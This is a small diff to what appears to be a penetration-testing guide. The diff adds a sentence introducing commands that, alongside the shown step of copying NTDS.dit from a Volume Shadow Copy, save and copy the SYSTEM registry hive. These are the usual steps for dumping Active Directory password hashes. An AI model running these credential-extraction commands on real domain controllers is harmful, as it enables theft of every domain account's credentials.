@@ -398,6 +398,8 @@ To make a copy of the NTDS.dit file from the Shadow Copy, execute the following 
 copy [shadow_copy_name]\windows\ntds\ntds.dit .\ad_ntds.dit
 ```
 
+Aside from that, we can also use the Shadow Copy Name to access the SYSTEM registry hive and SYSTEM configuration file by executing the following command:
+
 ```bash
 reg SAVE HKLM\SYSTEM .\ad_SYS_reg
 copy [shadow_copy_name]\windows\system32\config\SYSTEM .\ad_SYSTEM_cfg
